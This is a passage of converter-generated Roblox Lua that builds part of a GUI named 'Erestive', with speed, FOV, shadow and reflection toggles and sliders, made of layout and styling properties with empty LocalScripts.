G2L["1cd"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["1cd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1cd"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Animations
G2L["1ce"] = Instance.new("LocalScript", G2L["1cd"]);
G2L["1ce"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["1cf"] = Instance.new("ImageLabel", G2L["1ce"]);
G2L["1cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cf"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1cf"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["1cf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1cf"]["BackgroundTransparency"] = 1;
G2L["1cf"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.UICorner
G2L["1d0"] = Instance.new("UICorner", G2L["1cd"]);
G2L["1d0"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Button
G2L["1d1"] = Instance.new("TextButton", G2L["1cd"]);
G2L["1d1"]["TextWrapped"] = true;
G2L["1d1"]["TextSize"] = 14;
G2L["1d1"]["TextScaled"] = true;
G2L["1d1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["1d1"]["BackgroundTransparency"] = 1;
G2L["1d1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1d1"]["Text"] = [[ ]];
G2L["1d1"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Button.Animations
G2L["1d2"] = Instance.new("LocalScript", G2L["1d1"]);
G2L["1d2"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["1d3"] = Instance.new("LocalScript", G2L["1d1"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Text
G2L["1d4"] = Instance.new("TextLabel", G2L["1cd"]);
G2L["1d4"]["TextWrapped"] = true;
G2L["1d4"]["ZIndex"] = 9;
G2L["1d4"]["TextSize"] = 14;
G2L["1d4"]["TextScaled"] = true;
G2L["1d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["1d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d4"]["BackgroundTransparency"] = 1;
G2L["1d4"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1d4"]["Text"] = [[Set Speed]];
G2L["1d4"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.UIGradient
G2L["1d5"] = Instance.new("UIGradient", G2L["1cd"]);
G2L["1d5"]["Rotation"] = -90;
G2L["1d5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Speed
G2L["1d6"] = Instance.new("Frame", G2L["1cd"]);
G2L["1d6"]["BorderSizePixel"] = 0;
G2L["1d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d6"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["1d6"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["1d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d6"]["Name"] = [[Speed]];
G2L["1d6"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.SetFOV.Speed.UIListLayout
G2L["1d7"] = Instance.new("UIListLayout", G2L["1d6"]);
G2L["1d7"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.FOVConfig.UIListLayout
G2L["1d8"] = Instance.new("UIListLayout", G2L["1c9"]);
G2L["1d8"]["Padding"] = UDim.new(0, 10);
G2L["1d8"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.UIGradient
G2L["1d9"] = Instance.new("UIGradient", G2L["1c5"]);
G2L["1d9"]["Rotation"] = -90;
G2L["1d9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Speed.FOV.ImageLabel
G2L["1da"] = Instance.new("ImageLabel", G2L["1c5"]);
G2L["1da"]["BorderSizePixel"] = 0;
G2L["1da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1da"]["Image"] = [[rbxassetid://127633283332495]];
G2L["1da"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["1da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1da"]["BackgroundTransparency"] = 1;
G2L["1da"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF
G2L["1db"] = Instance.new("Frame", G2L["19c"]);
G2L["1db"]["BorderSizePixel"] = 0;
G2L["1db"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1db"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["1db"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["1db"]["Name"] = [[ONOFF]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.WhiteBar
G2L["1dc"] = Instance.new("Frame", G2L["1db"]);
G2L["1dc"]["BorderSizePixel"] = 0;
G2L["1dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1dc"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1dc"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1dc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1dc"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.WhiteBar.UIGradient
G2L["1dd"] = Instance.new("UIGradient", G2L["1dc"]);
G2L["1dd"]["Rotation"] = 90;
G2L["1dd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider
G2L["1de"] = Instance.new("Frame", G2L["1db"]);
G2L["1de"]["BorderSizePixel"] = 0;
G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1de"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["1de"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["1de"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Animations
G2L["1df"] = Instance.new("LocalScript", G2L["1de"]);
G2L["1df"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Animations.Sample
G2L["1e0"] = Instance.new("ImageLabel", G2L["1df"]);
G2L["1e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e0"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1e0"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["1e0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1e0"]["BackgroundTransparency"] = 1;
G2L["1e0"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.UICorner
G2L["1e1"] = Instance.new("UICorner", G2L["1de"]);
G2L["1e1"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.UIGradient
G2L["1e2"] = Instance.new("UIGradient", G2L["1de"]);
G2L["1e2"]["Rotation"] = -90;
G2L["1e2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Button
G2L["1e3"] = Instance.new("TextButton", G2L["1de"]);
G2L["1e3"]["TextSize"] = 14;
G2L["1e3"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["1e3"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["1e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e3"]["ZIndex"] = 2;
G2L["1e3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1e3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1e3"]["Text"] = [[ ]];
G2L["1e3"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Button.LocalScript
G2L["1e4"] = Instance.new("LocalScript", G2L["1e3"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.Slider.Button.UICorner
G2L["1e5"] = Instance.new("UICorner", G2L["1e3"]);
G2L["1e5"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.OnOrOff
G2L["1e6"] = Instance.new("TextLabel", G2L["1db"]);
G2L["1e6"]["TextWrapped"] = true;
G2L["1e6"]["ZIndex"] = 2;
G2L["1e6"]["TextSize"] = 14;
G2L["1e6"]["TextScaled"] = true;
G2L["1e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e6"]["BackgroundTransparency"] = 1;
G2L["1e6"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["1e6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1e6"]["Text"] = [[Off]];
G2L["1e6"]["Name"] = [[OnOrOff]];
G2L["1e6"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.UICorner
G2L["1e7"] = Instance.new("UICorner", G2L["1db"]);
G2L["1e7"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.UIGradient
G2L["1e8"] = Instance.new("UIGradient", G2L["1db"]);
G2L["1e8"]["Rotation"] = -90;
G2L["1e8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.ONOFF.ImageLabel
G2L["1e9"] = Instance.new("ImageLabel", G2L["1db"]);
G2L["1e9"]["BorderSizePixel"] = 0;
G2L["1e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1e9"]["Image"] = [[rbxassetid://15011030819]];
G2L["1e9"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["1e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e9"]["BackgroundTransparency"] = 1;
G2L["1e9"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2
G2L["1ea"] = Instance.new("Frame", G2L["19c"]);
G2L["1ea"]["BorderSizePixel"] = 0;
G2L["1ea"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1ea"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["1ea"]["Position"] = UDim2.new(-0, 0, 0, 0);
G2L["1ea"]["Name"] = [[2]];
G2L["1ea"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Text
G2L["1eb"] = Instance.new("TextLabel", G2L["1ea"]);
G2L["1eb"]["TextWrapped"] = true;
G2L["1eb"]["ZIndex"] = 9;
G2L["1eb"]["TextSize"] = 14;
G2L["1eb"]["TextScaled"] = true;
G2L["1eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1eb"]["BackgroundTransparency"] = 1;
G2L["1eb"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["1eb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1eb"]["Text"] = [[Shadows]];
G2L["1eb"]["Name"] = [[Text]];
G2L["1eb"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.WhiteBar
G2L["1ec"] = Instance.new("Frame", G2L["1ea"]);
G2L["1ec"]["BorderSizePixel"] = 0;
G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ec"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1ec"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1ec"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1ec"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.WhiteBar.UIGradient
G2L["1ed"] = Instance.new("UIGradient", G2L["1ec"]);
G2L["1ed"]["Rotation"] = 90;
G2L["1ed"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider
G2L["1ee"] = Instance.new("Frame", G2L["1ea"]);
G2L["1ee"]["BorderSizePixel"] = 0;
G2L["1ee"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1ee"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["1ee"]["Position"] = UDim2.new(0.80767, 0, 0.11724, 0);
G2L["1ee"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Animations
G2L["1ef"] = Instance.new("LocalScript", G2L["1ee"]);
G2L["1ef"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Animations.Sample
G2L["1f0"] = Instance.new("ImageLabel", G2L["1ef"]);
G2L["1f0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f0"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1f0"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["1f0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1f0"]["BackgroundTransparency"] = 1;
G2L["1f0"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.SliderCircle
G2L["1f1"] = Instance.new("Frame", G2L["1ee"]);
G2L["1f1"]["BorderSizePixel"] = 0;
G2L["1f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f1"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["1f1"]["Size"] = UDim2.new(0.301, 0, 0.73679, 0);
G2L["1f1"]["Position"] = UDim2.new(0.8, 0, 0.1223, 0);
G2L["1f1"]["Name"] = [[SliderCircle]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.SliderCircle.UICorner
G2L["1f2"] = Instance.new("UICorner", G2L["1f1"]);
G2L["1f2"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.UIGradient
G2L["1f3"] = Instance.new("UIGradient", G2L["1ee"]);
G2L["1f3"]["Rotation"] = -90;
G2L["1f3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.UICorner
G2L["1f4"] = Instance.new("UICorner", G2L["1ee"]);
G2L["1f4"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Button
G2L["1f5"] = Instance.new("TextButton", G2L["1ee"]);
G2L["1f5"]["TextSize"] = 14;
G2L["1f5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f5"]["ZIndex"] = 2;
G2L["1f5"]["BackgroundTransparency"] = 1;
G2L["1f5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1f5"]["Text"] = [[ ]];
G2L["1f5"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.Slider.Button.LocalScript
G2L["1f6"] = Instance.new("LocalScript", G2L["1f5"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.UIGradient
G2L["1f7"] = Instance.new("UIGradient", G2L["1ea"]);
G2L["1f7"]["Rotation"] = -90;
G2L["1f7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.UICorner
G2L["1f8"] = Instance.new("UICorner", G2L["1ea"]);
G2L["1f8"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.OnOrOff
G2L["1f9"] = Instance.new("TextLabel", G2L["1ea"]);
G2L["1f9"]["TextWrapped"] = true;
G2L["1f9"]["ZIndex"] = 2;
G2L["1f9"]["TextSize"] = 14;
G2L["1f9"]["TextScaled"] = true;
G2L["1f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f9"]["BackgroundTransparency"] = 1;
G2L["1f9"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["1f9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1f9"]["Text"] = [[On]];
G2L["1f9"]["Name"] = [[OnOrOff]];
G2L["1f9"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.2.OnOrOff.Shadows
G2L["1fa"] = Instance.new("LocalScript", G2L["1f9"]);
G2L["1fa"]["Name"] = [[Shadows]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3
G2L["1fb"] = Instance.new("Frame", G2L["19c"]);
G2L["1fb"]["BorderSizePixel"] = 0;
G2L["1fb"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["1fb"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["1fb"]["Position"] = UDim2.new(-0, 0, 0.07769, 0);
G2L["1fb"]["Name"] = [[3]];
G2L["1fb"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Text
G2L["1fc"] = Instance.new("TextLabel", G2L["1fb"]);
G2L["1fc"]["TextWrapped"] = true;
G2L["1fc"]["ZIndex"] = 9;
G2L["1fc"]["TextSize"] = 14;
G2L["1fc"]["TextScaled"] = true;
G2L["1fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fc"]["BackgroundTransparency"] = 1;
G2L["1fc"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["1fc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1fc"]["Text"] = [[Reflections]];
G2L["1fc"]["Name"] = [[Text]];
G2L["1fc"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.WhiteBar
G2L["1fd"] = Instance.new("Frame", G2L["1fb"]);
G2L["1fd"]["BorderSizePixel"] = 0;
G2L["1fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fd"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["1fd"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["1fd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["1fd"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.WhiteBar.UIGradient
G2L["1fe"] = Instance.new("UIGradient", G2L["1fd"]);
G2L["1fe"]["Rotation"] = 90;
G2L["1fe"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider
G2L["1ff"] = Instance.new("Frame", G2L["1fb"]);
G2L["1ff"]["BorderSizePixel"] = 0;
G2L["1ff"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1ff"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["1ff"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["1ff"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Animations
G2L["200"] = Instance.new("LocalScript", G2L["1ff"]);
G2L["200"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Animations.Sample
G2L["201"] = Instance.new("ImageLabel", G2L["200"]);
G2L["201"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["201"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["201"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["201"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["201"]["BackgroundTransparency"] = 1;
G2L["201"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.SliderCircle
G2L["202"] = Instance.new("Frame", G2L["1ff"]);
G2L["202"]["BorderSizePixel"] = 0;
G2L["202"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["202"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["202"]["Size"] = UDim2.new(0.301, 0, 0.73679, 0);
G2L["202"]["Position"] = UDim2.new(0.8, 0, 0.1223, 0);
G2L["202"]["Name"] = [[SliderCircle]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.SliderCircle.UICorner
G2L["203"] = Instance.new("UICorner", G2L["202"]);
G2L["203"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.UIGradient
G2L["204"] = Instance.new("UIGradient", G2L["1ff"]);
G2L["204"]["Rotation"] = -90;
G2L["204"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.UICorner
G2L["205"] = Instance.new("UICorner", G2L["1ff"]);
G2L["205"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Button
G2L["206"] = Instance.new("TextButton", G2L["1ff"]);
G2L["206"]["TextSize"] = 14;
G2L["206"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["206"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["206"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["206"]["ZIndex"] = 2;
G2L["206"]["BackgroundTransparency"] = 1;
G2L["206"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["206"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["206"]["Text"] = [[ ]];
G2L["206"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.Slider.Button.LocalScript
G2L["207"] = Instance.new("LocalScript", G2L["206"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.UIGradient
G2L["208"] = Instance.new("UIGradient", G2L["1fb"]);
G2L["208"]["Rotation"] = -90;
G2L["208"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.UICorner
G2L["209"] = Instance.new("UICorner", G2L["1fb"]);
G2L["209"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.OnOrOff
G2L["20a"] = Instance.new("TextLabel", G2L["1fb"]);
G2L["20a"]["TextWrapped"] = true;
G2L["20a"]["ZIndex"] = 2;
G2L["20a"]["TextSize"] = 14;
G2L["20a"]["TextScaled"] = true;
G2L["20a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20a"]["BackgroundTransparency"] = 1;
G2L["20a"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["20a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["20a"]["Text"] = [[On]];
G2L["20a"]["Name"] = [[OnOrOff]];
G2L["20a"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.3.OnOrOff.Shadows
G2L["20b"] = Instance.new("LocalScript", G2L["20a"]);
G2L["20b"]["Name"] = [[Shadows]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1
G2L["20c"] = Instance.new("Frame", G2L["19c"]);
G2L["20c"]["BorderSizePixel"] = 0;
G2L["20c"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["20c"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["20c"]["Position"] = UDim2.new(-0, 0, 0.15537, 0);
G2L["20c"]["Name"] = [[1]];
G2L["20c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.1.Text
G2L["20d"] = Instance.new("TextLabel", G2L["20c"]);
G2L["20d"]["TextWrapped"] = true;
G2L["20d"]["ZIndex"] = 9;
G2L["20d"]["TextSize"] = 14;
G2L["20d"]["TextScaled"] = true;
G2L["20d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
